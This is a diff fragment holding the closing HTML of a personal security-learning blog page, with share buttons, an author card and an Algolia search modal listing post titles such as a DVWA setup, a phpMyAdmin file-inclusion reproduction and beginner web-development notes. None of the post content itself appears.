+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/23/代码执行及永恒之蓝漏洞复现/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">han</h4>
+        
+            <div id="about-card-bio"><p>life and code</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Web Security</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Beijing, China
+            </div>
+        
+    </div>
+</div>
+
+        
+            <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-times"></i></span>
+            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="/assets/images/logo-algolia-nebula-blue-full.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    />
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa 在 CentOS 部署"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa 在 CentOS 部署"
+                        >
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: CentOS7部署DVWA</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin文件包含漏洞复现"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin文件包含漏洞复现"
+                        >
+                            <h3 class="media-heading">phpmyadmin文件包含漏洞复现</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
+                        >
+                            <h3 class="media-heading">笔记11</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 本文档主要记录2019/07/29学习的主要内容</p>
+<a id="more"></a></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": 第二周总结"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": 第二周总结"
+                        >
+                            <h3 class="media-heading">第二周总结</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1367188/pexels-photo-1367188.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <h3 class="media-heading">markdown语法</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 用typora写markdown文档的语法</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1564414872027-5ae7dac9a76f?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=700&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <h3 class="media-heading">stage1知识盲点</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 知识盲点总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": 笔记12"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": 笔记12"
+                        >
+                            <h3 class="media-heading">笔记12</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初学HTML</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": 笔记13"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": 笔记13"
+                        >
+                            <h3 class="media-heading">笔记13</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初探CSS+JS</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": 笔记14"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": 笔记14"
+                        >
+                            <h3 class="media-heading">笔记14</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": 笔记15"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": 笔记15"
+                        >
+                            <h3 class="media-heading">笔记15</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 3, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                70 posts found
+            </p>
+        </div>
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+    <script src="/assets/js/moment-with-locales.js"></script>
+    <script src="/assets/js/algoliasearch.js"></script>
+    <script>
+      var algoliaClient = algoliasearch('QHU2Y8U611', 'c66d405f4a2145e747c10a811d8acae2');
+      var algoliaIndex = algoliaClient.initIndex('tranquilpeak');
+    </script>
+
+
+    </body>
+</html>
